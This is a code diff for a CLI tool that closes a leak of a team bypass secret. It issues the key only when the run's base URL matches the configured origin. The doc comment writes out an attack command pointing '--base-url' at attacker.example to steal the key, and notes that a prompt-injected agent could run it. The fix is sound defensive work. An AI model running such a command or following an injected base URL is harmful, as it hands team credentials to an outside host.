@@ -5,6 +5,7 @@ import { dirname, join } from 'node:path';
 import { z } from 'zod';
 import { CliError } from './errors';
 import {
+  CONFIG_DEFAULTS,
   PublishModeSchema,
   SEND_MAX_UNSET,
   loadRawConfig,
@@ -12,7 +13,13 @@ import {
   resolvePublishMode,
   resolveSettings,
 } from './config';
-import type { Provenance, ProjectPublishLayer, PublishMode } from './config';
+import type {
+  EffectiveSettings,
+  PartialConfig,
+  Provenance,
+  ProjectPublishLayer,
+  PublishMode,
+} from './config';
 import type { ShelfBypass } from './http';
 import { parseUsdToAtomic } from './money';
 import { parseConfirmPolicy, type SpendPolicy } from './policy';
@@ -29,13 +36,15 @@ export interface ResolvedSettings {
    *  to, and the one other origin `read`/`buy`/`inspect` will resolve against. */
   publicShelfUrl: string;
   /**
-   * The team shelf's bypass secret paired with `baseUrl`'s origin, or undefined
-   * in public mode. Handed to the transport, which attaches the header from the
-   * REQUEST URL — so it cannot reach `publicShelfUrl` however it is passed.
+   * The team shelf's bypass secret paired with the CONFIGURED `baseUrl`'s
+   * origin, or undefined in public mode and on a run whose base URL came from
+   * `--base-url`/`TENJIN_BASE_URL` (see {@link resolveShelfBypass}). Handed to
+   * the transport, which attaches the header from the REQUEST URL — so it cannot
+   * reach `publicShelfUrl` however it is passed.
    */
   bypass?: ShelfBypass;
-  /** True exactly when a bypass secret is configured: the one switch between
-   *  public mode and team mode. */
+  /** True exactly when the door key was issued: the one switch between public
+   *  mode and team mode. */
   teamMode: boolean;
   rpcUrl: string;
   policy: SpendPolicy;
@@ -53,15 +62,56 @@ export interface ResolvedSettings {
   sendMaxAmountAtomic: bigint | null | typeof SEND_MAX_UNSET;
 }
 
+/** `URL.origin`, or undefined for anything unparseable. */
+function tryOrigin(url: string): string | undefined {
+  try {
+    return new URL(url).origin;
+  } catch {
+    return undefined;
+  }
+}
+
+/**
+ * The team shelf's door key, paired with the origin THE OPERATOR CONFIGURED —
+ * never with the one this run happens to be pointed at.
+ *
+ * `shelfBypassSecret` is file-only, but `baseUrl` is not: `--base-url` and
+ * `TENJIN_BASE_URL` outrank the file. Pairing the secret with the RESOLVED base
+ * URL therefore let one command hand the team's key to any host that was named
+ * on the command line — `tenjin search --base-url https://attacker.example "…"`
+ * sends it in the first request, and the transport's origin test agrees, because
+ * the pair it compares against was built from the attacker's URL. That is not a
+ * hypothetical shape: `resource-ref`'s own refusal text already names a
+ * task-supplied `--base-url` as the attack a prompt-injected agent runs.
+ *
+ * So the compare happens here, once, before the pair exists: the key is issued
+ * only when the run is still pointed at the configured shelf. A run pointed
+ * anywhere else gets NO pair at all, which also drops team mode — an overridden
+ * base URL runs as an ordinary public-mode run, with the client scan and the
+ * confirm cascade back on, rather than as a team-mode run against a stranger.
+ *
+ * The generated hooks need no equivalent: they read `baseUrl` straight out of
+ * config.json and have no flag or env layer to be re-pointed through.
+ */
+export function resolveShelfBypass(
+  config: PartialConfig,
+  s: EffectiveSettings,
+): ShelfBypass | undefined {
+  const secret = s.shelfBypassSecret.value;
+  if (secret.length === 0) return undefined;
+  const configured = tryOrigin(config.baseUrl ?? CONFIG_DEFAULTS.baseUrl);
+  const effective = tryOrigin(s.baseUrl.value);
+  if (configured === undefined || effective === undefined || configured !== effective) {
+    return undefined;
+  }
+  return { origin: configured, secret };
+}
+
 export async function resolveContextSettings(ctx: CommandContext): Promise<ResolvedSettings> {
   const config = await loadRawConfig(ctx.dataDir);
   const s = resolveSettings({ config, flags: { baseUrl: ctx.flags.baseUrl }, env: process.env });
-  const secret = s.shelfBypassSecret.value;
   // Paired with the origin here, once, so no command has to remember to.
-  // `new URL` cannot throw: baseUrl is z.url()-validated on the way in, and the
-  // flag/env overrides are parsed at their own edges.
-  const bypass =
-    secret.length > 0 ? { origin: new URL(s.baseUrl.value).origin, secret } : undefined;
+  const bypass = resolveShelfBypass(config, s);
   return {
     baseUrl: s.baseUrl.value,
     publicShelfUrl: s.publicShelfUrl.value,
